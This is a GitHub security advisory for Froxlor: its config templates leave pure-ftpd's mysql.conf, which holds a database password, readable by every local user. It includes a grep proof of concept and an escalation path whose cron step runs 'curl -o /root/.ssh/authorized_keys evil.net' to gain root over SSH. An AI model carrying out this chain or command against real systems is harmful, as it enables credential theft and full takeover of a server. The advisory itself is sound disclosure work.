# [H] Froxlor: /etc/pure-ftpd/db/mysql.conf is chmod 644 but contains <SQL_UNPRIVILEGED_PASSWORD>

## Summary
Severity: High
Advisory: GHSA-34qg-65m4-f23m
CWE: CWE-732
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L (CVSS_V3)
Published: 2024-08-23
Source: https://github.com/advisories/GHSA-34qg-65m4-f23m
Type: github-advisory

## Affected
- Packagist: `froxlor/froxlor` — affected >=0 <2.2.0

## Details
### Summary
In Froxlor 2.1.9 and in the HEADs of the `main`, `v2.2` and `v2.1` branches , the XML templates in `lib/configfiles/` set `chmod 644` for `/etc/pure-ftpd/db/mysql.conf`, although that file contains `<SQL_UNPRIVILEGED_PASSWORD>`. At least on Debian 12, all parent directories of `/etc/pure-ftpd/db/mysql.conf` are world readable by default, thus exposing these credentials to all users with access to the system. Only Froxlor instances configured to use pure-ftpd are affected/vulnerable.

### Details
https://github.com/froxlor/Froxlor/blob/2.1.9/lib/configfiles/bookworm.xml#L3075

### PoC
As non-privileged user:
```
nobody@mail:/tmp$ grep MYSQLPassword /etc/pure-ftpd/db/mysql.conf
MYSQLPassword   MySecretMySQLPasswordForFroxlor
```


### Impact
Any unprivileged user with "command/code execution" access to the system can trivially obtain the credentials granting access to the `froxlor` MySQL database. This holds true even for virtual users without SSH access as long as they are able to upload their own PHP scripts or other CGIs, and works even if the admin has setup a separate php-fpm pool that runs as their own user.

Side note: This access to the database can be leveraged to obtain Froxlor admin privileges, and subsequently root privileges. For example:
1. Use the database credentials to extract or change a Froxlor admin's password hash and TOTP seed value.
2. Log into Froxlor as that admin.
3. Set the `Cron-daemon reload command` in `/admin_settings.php?page=overview&part=crond` to something like `curl -o /root/.ssh/authorized_keys evil.net`.
4. Wait a few minutes until the relevant cronjob runs, then log in via SSH.


Please consider using passwordless unix socket authentication. Current versions of MySQL, MariaDB and Percona allow completely removing/omitting database passwords for database connections going through a unix socket, this works even for use cases where the database user has a different name than the system account running the database client:
https://dev.mysql.com/doc/refman/5.7/en/socket-pluggable-authentication.html

## References
- https://github.com/froxlor/Froxlor/security/advisories/GHSA-34qg-65m4-f23m
- https://github.com/froxlor/Froxlor/commit/5d2ce4ecfb0e9c397ef5c73b107fb9a0e122e910
- https://github.com/froxlor/Froxlor
- https://github.com/froxlor/Froxlor/blob/2.1.9/lib/configfiles/bookworm.xml#L3075
